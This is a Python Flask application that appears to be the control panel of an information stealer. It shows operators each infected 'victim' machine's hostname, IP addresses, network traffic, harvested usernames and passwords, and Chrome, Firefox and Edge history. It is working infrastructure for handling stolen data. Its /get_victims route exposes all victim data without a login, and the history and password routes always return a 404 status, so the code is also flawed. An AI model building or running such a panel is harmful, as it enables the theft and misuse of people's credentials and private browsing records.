import os
import logging
from werkzeug.utils import secure_filename
from flask import Flask, render_template, request, redirect, url_for, session, flash, send_from_directory, jsonify
import pymysql
from bcrypt import hashpw, gensalt, checkpw
from datetime import timedelta
from pymysql.cursors import DictCursor
from config import database_connection

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.permanent_session_lifetime = timedelta(minutes=30)

logging.basicConfig(level=logging.DEBUG)

def get_db_connection():
    """Utility function to create a new database connection."""
    return pymysql.connect(**database_connection)

def get_victim(victim_id):
    """Fetch victim details by victim_id."""
    try:
        conn = get_db_connection()
        with conn.cursor(DictCursor) as cursor:
            cursor.execute("SELECT id, username FROM system_info WHERE id = %s", (victim_id,))
            victim = cursor.fetchone()
        conn.close()
        return victim
    except Exception as e:
        logging.error(f"Error fetching victim: {e}")
        return None

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db_connection()
        with conn.cursor(DictCursor) as cursor:
            cursor.execute("SELECT username, password FROM list_admin WHERE username = %s", (username,))
            user = cursor.fetchone()
        conn.close()

        if user and checkpw(password.encode('utf-8'), user['password'].encode('utf-8')):
            session['username'] = user['username']
            return redirect(url_for('dashboard'))
        
        else:
            flash('Username atau Password salah', 'error')
            return render_template('login.html')
        
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    username = session.get('username')
    if not username:
        return redirect(url_for('login'))

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT username FROM list_admin WHERE username = %s", (username,))
        user_data = cursor.fetchone()
    conn.close()
    
    return render_template('dashboard.html', user=user_data)

@app.route('/victim')
def victim():
    username = session.get('username')
    if not username:
        return redirect(url_for('login'))

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT username FROM list_admin WHERE username = %s", (username,))
        user_data = cursor.fetchone()
        
        # Fetch victim data, using 'created_at' instead of 'start_date'
        cursor.execute(""" 
            SELECT t.id, t.username, t.hostname, t.local_ip, t.public_ip, t.created_at
            FROM system_info t
            INNER JOIN (
                SELECT hostname, MAX(created_at) AS max_time
                FROM system_info
                GROUP BY hostname
            ) grouped 
            ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
        """)
        victim_data = cursor.fetchall()  # Changed from victims to victim_data

    conn.close()

    return render_template('victim.html', user=user_data, victim_data=victim_data)  # Pass victim_data



@app.route('/settings', methods=['GET', 'POST'])
def settings():
    username = session.get('username')

    if not username:
        return redirect(url_for('login'))

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT username, password FROM list_admin WHERE username = %s", (username,))
        user_data = cursor.fetchone()

    if request.method == 'POST':
        new_password = request.form['newPassword']
        confirm_password = request.form['confirmPassword']

        if new_password != confirm_password:
            flash("Password dan konfirmasi password tidak cocok!", "error")
            return render_template('settings.html', user=user_data)

        hashed_password = hashpw(new_password.encode('utf-8'), gensalt())
        with conn.cursor() as cursor:
            cursor.execute("UPDATE list_admin SET password = %s WHERE username = %s", (hashed_password, username))
        conn.commit()
        flash("Profile updated successfully!", "success")
        return redirect(url_for('settings'))

    conn.close()
    return render_template('settings.html', user=user_data)

@app.route('/get_victims', methods=['GET'])
def get_victims():
    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute(""" 
            SELECT t.* 
            FROM system_info t 
            INNER JOIN (
                SELECT hostname, MAX(created_at) AS max_time 
                FROM system_info 
                GROUP BY hostname
            ) grouped 
            ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
        """)
        victims = cursor.fetchall()
    conn.close()
    return jsonify(victims)

@app.route('/overview')
def overview():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    if not victim:
        return "Victim not found", 404

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
        victim_data = cursor.fetchone()

        cursor.execute(""" 
            SELECT packets_sent, packets_recv, created_at 
            FROM system_info 
            WHERE id = %s 
            ORDER BY created_at DESC 
            LIMIT 5
        """, (victim_id,))
        network_data = cursor.fetchall()

        cursor.execute("SELECT usernames, passwords, chrome_history, firefox_history, edge_history FROM system_info WHERE id = %s", (victim_id,))
        info = cursor.fetchone()

        total_passwords = 0
        if info['usernames']:
            total_passwords = len(info['usernames'].strip().split('\n'))
        elif info['passwords']:
            total_passwords = len(info['passwords'].strip().split('\n'))

        total_history = 0
        for key in ['chrome_history', 'firefox_history', 'edge_history']:
            if info[key]:
                total_history += len(info[key].strip().split('\n'))
    conn.close()

    if victim_data and network_data:
        labels = [row['created_at'].strftime('%Y-%m-%d %H:%M:%S') for row in network_data]
        packets_sent = [row['packets_sent'] / 1000 for row in network_data]
        packets_recv = [row['packets_recv'] / 1000 for row in network_data]

        return render_template(
            'overview.html', 
            victim=victim_data, 
            labels=labels, 
            packets_sent=packets_sent, 
            packets_recv=packets_recv, 
            scale_factor=1000,
            total_passwords=total_passwords,
            total_history=total_history
        )
    else:
        return "Network data not found", 404


@app.route('/history')
def history():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    if not victim:
        return "Victim not found", 404

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT chrome_history, firefox_history, edge_history FROM system_info WHERE id = %s", (victim_id,))
        victim_history = cursor.fetchone()
    conn.close()

    return render_template('history.html', victim_history=victim_history, victim=victim) if victim_history else "History data not found", 404

@app.route('/passcookies')
def passcookies():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    if not victim:
        return "Victim not found", 404

    conn = get_db_connection()
    with conn.cursor(DictCursor) as cursor:
        cursor.execute("SELECT url, usernames, passwords FROM system_info WHERE id = %s", (victim_id,))
        victim_data = cursor.fetchone()
    conn.close()

    return render_template('passcookies.html', victim_data=victim_data, victim=victim) if victim_data else "Cookies data not found", 404

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
